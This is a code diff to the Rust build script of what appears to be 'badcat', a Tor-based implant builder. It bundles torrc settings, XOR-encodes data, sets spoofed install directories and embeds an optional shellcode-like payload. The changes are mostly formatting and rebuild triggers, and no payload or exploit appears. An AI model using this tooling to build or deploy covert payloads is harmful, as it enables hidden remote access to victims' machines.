@@ -1,8 +1,8 @@
+use std::io::Read;
 use std::path::{Path, PathBuf};
-use std::io::{Read};
-use std::{collections, error, fs, process, env};
+use std::{collections, env, error, fs, process};
 
-use badcat_lib::{xor, secrets};
+use badcat_lib::{secrets, xor};
 use json::JsonValue;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
@@ -28,7 +28,7 @@ struct BuildSetting {
 
     /// Torrc file to bundle
     torrc_file: PathBuf,
-    
+
     /// Whether or not to use shellcode like payload
     uses_payload: bool,
 
@@ -46,6 +46,11 @@ fn main() -> Result<(), Box<dyn error::Error>> {
 
     let setting = parse_settings(&raw_settings);
     println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
+    println!("cargo:rerun-if-changed={}", setting.torrc_file.to_str().unwrap());
+
+    if setting.uses_payload {
+        println!("cargo:rerun-if-changed={}", setting.payload_file.to_str().unwrap());
+    }
 
     let mut replacements = collections::HashMap::new();
 
@@ -70,7 +75,7 @@ fn encode_bundle(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>
 
     {
         let mut archive = tar::Builder::new(&mut buf);
-        
+
         archive.append_dir_all(".", &dir)?;
     }
 
@@ -85,8 +90,7 @@ fn encode_data(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> 
     data["uses_payload"] = setting.uses_payload.into();
     data["payload_port"] = setting.payload_port.clone().into();
 
-    let mut torrc = fs::read_to_string(&setting.torrc_file)
-        .expect("problem reading torrc file");
+    let mut torrc = fs::read_to_string(&setting.torrc_file).expect("problem reading torrc file");
 
     if !setting.is_tor_for_windows {
         torrc += r#"
@@ -113,8 +117,7 @@ ControlSocket @{CTRL_SOCKET}
 
 fn encode_payload(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
     let payload = if setting.uses_payload {
-        let mut file = fs::File::open(&setting.payload_file)
-            .expect("problem reading payload file");
+        let mut file = fs::File::open(&setting.payload_file).expect("problem reading payload file");
 
         let mut buf = Vec::new();
         file.read_to_end(&mut buf)?;
@@ -231,13 +234,21 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
     };
 
     let spoof_dir = if is_tor_for_windows {
-        String::from(raw["tor"]["spoof_dir"]["windows"].as_str().unwrap_or_else(|| {
-            panic!("invalid windows download directory");
-        }))
+        String::from(
+            raw["tor"]["spoof_dir"]["windows"]
+                .as_str()
+                .unwrap_or_else(|| {
+                    panic!("invalid windows download directory");
+                }),
+        )
     } else {
-        String::from(raw["tor"]["spoof_dir"]["linux"].as_str().unwrap_or_else(|| {
-            panic!("invalid linux destination directory");
-        }))
+        String::from(
+            raw["tor"]["spoof_dir"]["linux"]
+                .as_str()
+                .unwrap_or_else(|| {
+                    panic!("invalid linux destination directory");
+                }),
+        )
     };
 
     let torrc_file = PathBuf::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
@@ -247,9 +258,11 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
     let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);
 
     let payload_file = if uses_payload {
-        PathBuf::from(raw["payload"]["file"].as_str().unwrap_or_else(|| {
-            panic!("invalid payload setting")
-        }))
+        PathBuf::from(
+            raw["payload"]["file"]
+                .as_str()
+                .unwrap_or_else(|| panic!("invalid payload setting")),
+        )
     } else {
         PathBuf::from("")
     };
